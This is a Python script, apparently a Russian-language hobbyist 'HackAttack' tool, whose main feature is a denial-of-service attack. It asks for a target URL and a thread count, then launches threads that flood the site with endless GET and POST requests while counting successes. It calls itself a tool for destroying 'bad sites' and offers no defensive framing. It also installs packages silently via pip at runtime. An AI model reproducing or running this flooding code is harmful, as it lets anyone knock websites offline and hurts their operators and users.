import os
import time as t

try:
    from colorama import Fore, Back, Style
except:
    os.system('pip install colorama')
    from colorama import Fore, Back, Style

print(Fore.RED)
print(Back.BLACK)

try:
    from platform import platform
except:
    print('Не найдена библиотека: platform')
    print('Установка библиотеки: platform')
    os.system("pip install platform")
    from platform import platform
    t.sleep(3)
    print('Попытка восстановить запуск:')
    t.sleep(3)

puk = platform()[0], platform()[1], platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'

try:
    from art import *
except:
    print('Не найдена библиотека: Art')
    print('Установка библиотеки: Art')
    t.sleep(3)
    os.system("pip install art")
    t.sleep(3)
    print('Попытка восстановить запуск:')
    t.sleep(3)
    from art import *

try:
    import requests
except:
    print('Не найдена библиотека: Requests')
    print('Установка библиотеки: Requests')
    t.sleep(3)
    os.system("pip install requests")
    print('Попытка восстановить запуск:')
    t.sleep(3)
    import requests

import threading

def printtext(text):
    art1 = text2art(text)
    print(art1)

menu = """1: DDoS Аттака!
2: Об утилите!"""

def text(text):
    print(Fore.LIGHTBLUE_EX)
    print(text)
    print(Fore.YELLOW)

def error(text):
    print(Fore.RED)
    os.system(delet)
    printtext('Error')
    print(text)
    t.sleep(3)
    print(Fore.YELLOW)

def title():
    os.system(delet)
    print(Fore.GREEN)
    printtext('HackAttack')

def load():
    loading = '----------'
    load2 = ''
    for i in loading:
        title()
        print(Fore.YELLOW)
        load2 = f'{load2}{i}'
        printtext(load2)
        t.sleep(1)

def register():
    while True:
        load()
        os.system(delet)
        print(Fore.GREEN)
        printtext('HackAttack')
        print(Fore.LIGHTBLUE_EX)
        print(menu)
        print(Fore.YELLOW)
        try:
            menu_number = int(input('Введите число: '))
            if menu_number == 1:
                ddos()
                break
            else:
                if menu_number == 2:
                    info()
                else:
                    error('Не найдено ничего!')
                    register()
                    break
        except ValueError:
            error('Вы должны были ввести число!')

ddos = None
th = None
url = None
count = 0
count2 = 0

def ddos_url():
    global count
    global count2
    while True:
        try:
            requests.get(url)
            requests.post(url)
            count += 1
            print(Fore.GREEN)
            print(f'[ + ] Удалось отправить запрос ! Удалось: {count} раз!')
        except:
            count2 += 1
            print(Fore.RED)
            print(f'[ - ] не удалось отправить запрос ! Не удалось: {count2} раз!')

def ddos_url3():
    global count
    global count2
    while True:
        try:
            requests.get(url)
            requests.post(url)
            count += 1
            print(Fore.GREEN)
            print(f'[ + ] Удалось отправить запрос ! Удалось: {count} раз!')
        except:
            count2 += 1
            print(Fore.RED)
            print(f'[ - ] не удалось отправить запрос ! Не удалось: {count2} раз!')


def ddos():
    while True:
        title()
        global url
        print(Fore.YELLOW)
        url = str(input('Ссылка: '))
        os.system(delet)
        title()
        try:
            global th
            global ddos
            th = int(input('Кол-во потоков: '))
            ddos = 'yes'
            break
        except ValueError:
            error('Вы должны были ввести число!')



def info():
    title()
    print('Создатель: HackerRullerTools\nСоздано для уничтожения плохих сайтов!')
    t.sleep(10)
    register()

register()

if ddos == 'yes':
    for i in range(th):
        threading.Thread(target=ddos_url).start()
    for i in range(th):
        threading.Thread(target=ddos_url3).start()